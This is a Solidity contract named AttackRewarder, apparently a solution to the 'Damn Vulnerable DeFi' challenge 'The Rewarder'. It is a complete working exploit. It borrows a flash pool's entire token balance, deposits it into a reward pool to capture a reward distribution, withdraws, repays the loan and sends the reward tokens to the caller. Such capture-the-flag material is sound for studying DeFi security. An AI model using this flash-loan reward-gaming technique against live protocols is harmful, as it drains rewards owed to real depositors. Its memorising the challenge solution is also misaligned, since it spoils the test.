// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {TheRewarderPool, RewardToken} from "./TheRewarderPool.sol";
import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";

contract AttackRewarder {
    FlashLoanerPool private flashPool;
    TheRewarderPool private rewardPool;
    DamnValuableToken private token;

    constructor(address _flashPool, address _rewardPool, address _token) {
        flashPool = FlashLoanerPool(_flashPool);
        rewardPool = TheRewarderPool(_rewardPool);
        token = DamnValuableToken(_token);
    }

    function attack() external {
        flashPool.flashLoan(token.balanceOf(address(flashPool)));
        RewardToken(rewardPool.rewardToken()).transfer(
            msg.sender,
            RewardToken(rewardPool.rewardToken()).balanceOf(address(this))
        );
    }

    function receiveFlashLoan(uint256 amount) external {
        token.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);

        token.transfer(address(flashPool), amount);
    }
}
